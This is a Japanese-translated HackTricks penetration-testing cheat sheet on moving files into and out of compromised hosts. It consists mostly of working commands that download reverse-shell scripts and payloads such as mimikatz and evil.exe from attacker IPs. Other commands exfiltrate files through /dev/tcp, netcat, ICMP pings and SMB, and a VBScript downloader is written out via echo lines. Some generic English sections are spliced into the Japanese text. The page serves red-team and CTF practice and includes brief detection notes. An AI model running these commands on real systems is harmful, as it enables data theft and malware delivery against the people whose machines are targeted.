# 情報の外部への持ち出し

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
- **ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## 情報の外部への持ち出しに使用される一般的にホワイトリストに登録されているドメイン

一般的に悪用される可能性のあるホワイトリストに登録されているドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/)をチェックしてください

## Base64のコピー＆ペースト

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### ファイルのアップロード

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Pythonモジュール [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPSサーバー**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTPサーバー（Python）
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTPサーバー（NodeJS）
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTPサーバー（pure-ftp）
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** クライアント
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kaliをサーバーとして使用
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
または、Sambaを使用してSMB共有を作成します：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
## Exfiltration

### Exfiltration Techniques

Exfiltration techniques are used to **steal** data from a target network. Once an attacker gains access to a network, they need to find a way to exfiltrate the data they are after. There are several common exfiltration techniques:

- **Compression**: Compressing data before exfiltrating it can help avoid detection.
- **Encryption**: Encrypting data makes it harder for security tools to detect the exfiltrated data.
- **Steganography**: Hiding data within other files or messages can help evade detection.
- **Traffic **: Sending data out in small, inconspicuous chunks can help avoid detection.
- **DNS Tunneling**: Sending data over DNS requests can bypass some security controls.
- **Exfiltration over Alternative Protocols**: Using protocols other than HTTP/HTTPS can help avoid detection.

### Exfiltration Tools

There are several tools available to help with exfiltrating data from a target network. Some popular tools include:

- **Netcat**: A versatile networking utility that can be used for exfiltration.
- **Wget**: A command-line utility for downloading files, which can be used to exfiltrate data.
- **Curl**: Another command-line tool for transferring data with support for various protocols.
- **FTP**: File Transfer Protocol can be used for exfiltrating data over a network.
- **SCP**: Secure Copy Protocol can securely transfer files between hosts on a network.

### Exfiltration Resources

In addition to tools, there are resources available to help with exfiltration:

- **GitHub**: A popular platform for finding exfiltration tools and resources.
- **Forums**: Online forums can be a valuable resource for learning about exfiltration techniques.
- **Blogs**: Security blogs often contain information about exfiltration methods and tools.
- **Tutorials**: Online tutorials can provide step-by-step guidance on exfiltrating data from a network.
- **Books**: There are books available that cover exfiltration techniques in detail.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻撃者はSSHdを実行している必要があります。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

被害者がSSHを持っている場合、攻撃者は被害者から攻撃者にディレクトリをマウントできます。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

### Data Exfiltration

#### Description

The Netcat (`nc`) utility is a versatile tool that can be used for data exfiltration. It allows for creating a connection between two systems, enabling the transfer of data between them. Netcat can be used to send files, directories, or even entire hard drive images over a network.

#### Methodology

1. **Listener Setup**: Start a listener on the receiving system using the following command:
   ```bash
   nc -lvp <port> > output.file
   ```

2. **Sender Setup**: Initiate a connection from the sending system to the listener using the following command:
   ```bash
   nc <receiver_ip> <port> < input.file
   ```

3. **Data Transfer**: Data will be transferred from the sender to the listener and saved in the `output.file` on the receiving system.

#### Detection

- Monitor network traffic for suspicious connections using Netcat.
- Look for unusual data transfers over non-standard ports.
- Implement egress filtering to restrict the use of Netcat on systems.

#### Prevention

- Disable or restrict the use of Netcat on systems where it is not required.
- Implement network segmentation to limit the scope of potential data exfiltration.
- Use encryption to secure data being transferred over the network.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### 攻撃対象からファイルをダウンロード
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### ターゲットにファイルをアップロード
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
感謝 **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

SMTPサーバーにデータを送信できる場合、Pythonを使用してデータを受信するSMTPを作成できます：
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

XPおよび2003ではデフォルトで有効（他のOSではインストール時に明示的に追加する必要がある）

Kaliでは、**TFTPサーバーを起動**します：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**PythonでのTFTPサーバー:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**被害者**で、Kaliサーバーに接続します：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHPのワンライナーを使用してファイルをダウンロードします：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

### VBScript Exfiltration

VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an external server. This can be achieved by creating an HTTP request object, setting the request headers and body with the data to be exfiltrated, and sending the request to a remote server. This technique can be used to bypass network restrictions and exfiltrate data without directly connecting to the target network.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**被害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe`プログラムは、バイナリの検査だけでなく、**16進数からバイナリを再構築する機能**も持っています。これは、バイナリの16進数を提供することで、`debug.exe`がバイナリファイルを生成できることを意味します。ただし、`debug.exe`には**64 kbまでのファイルをアセンブリングするという制限**があることに注意することが重要です。
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**してください
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください

</details>
